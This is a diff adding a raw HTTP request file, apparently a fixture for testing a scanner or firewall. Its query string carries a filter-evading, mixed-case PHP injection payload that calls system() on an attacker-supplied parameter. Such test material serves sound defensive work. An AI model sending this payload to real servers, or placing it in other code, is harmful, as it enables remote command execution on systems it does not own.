@@ -1,0 +1,4 @@
+GET /a?token=@sYsTeM($_gEt['C']); HTTP/1.1
+Host: demo.example.com
+Connection: close
+
